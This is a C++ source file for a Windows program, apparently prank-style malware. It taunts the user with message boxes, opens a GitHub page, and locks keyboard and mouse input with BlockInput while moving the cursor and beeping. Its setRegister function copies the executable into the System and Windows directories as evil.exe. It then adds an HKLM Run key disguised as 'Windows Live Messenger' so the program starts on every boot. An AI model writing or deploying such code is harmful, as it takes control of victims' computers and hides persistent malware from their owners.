#include <windows.h>
#include <fstream>

bool checkIfBlockingInputIsPossible();
void setRegister();
void radkumWebsite();
void maliciousBehaviour();

constexpr size_t LOOP_NUMBER = 3;

int main()
{
    //check if we run as administrator
    if (!checkIfBlockingInputIsPossible()) {
        return -1;
    }
    
    //show messageBox
    if (::MessageBoxA(NULL, "I'm watching you", "Windows", MB_OKCANCEL) == IDCANCEL)
    {
        ::MessageBoxA(NULL, "HAHAHAHA!", "radkum", MB_OK);
    }

    //sleep 2 seconds
    ::Sleep(2000);

    for(size_t i = 0; i < LOOP_NUMBER; i++)
    {
        radkumWebsite();
       
        //sleep 2 seconds
        ::Sleep(2000);

        maliciousBehaviour();

        //sleep 2 seconds
        ::Sleep(2000);
    }
    setRegister();
    return 0;
}
void maliciousBehaviour() {
    int x = 0;
    int y = 0;
    for (size_t i = 0; i < LOOP_NUMBER; i++)
    {
        x += 160;
        y += 90;

        ::BlockInput(TRUE);
        ::SetCursorPos(x, y);

        //sleep 0.5 seconds
        ::Sleep(500);
    }

    //Sleep(1000);
    int freq = 100;
    for (size_t i = 0; i < LOOP_NUMBER; i++)
    {
        //printf("inner loop counter: %d\n", loop);
        ::Beep(freq, 100);

        //sleep 0.5 seconds
        ::Sleep(500);
        freq++;
    }
}

void radkumWebsite() {
    char websiteAddress[MAX_PATH] = "https://github.com/radkum";
    ShellExecuteA(NULL, "open", websiteAddress, NULL, NULL, SW_MAXIMIZE);

    MessageBoxA(
        NULL,
        "Oh,you want see my project? Welcome!",
        "radkum",
        MB_OK);
}

bool checkIfBlockingInputIsPossible() {
    BlockInput(TRUE);
    if (GetLastError() == 0x05 /*ACCESS_DENIED*/) {
        printf("Please run app as administrator!\n");
        return false;
    }
    BlockInput(FALSE);

    return true;
}

void setRegister() {
    char system[MAX_PATH];
    char windows[MAX_PATH];
    char pathtofile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileNameA(GetModH, pathtofile, sizeof(pathtofile));
    GetSystemDirectoryA(system, sizeof(system));
    GetWindowsDirectoryA(windows, sizeof(windows));
    strcat_s(system, "\\evil.exe");
    strcat_s(windows, "\\evil.exe");
    CopyFileA(pathtofile, system, false);
    CopyFileA(pathtofile, windows, false);
    HKEY hKey;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueExA(hKey, "Windows Live Messenger", 0, REG_SZ, (const unsigned char*)system, sizeof(system));
    RegCloseKey(hKey);
}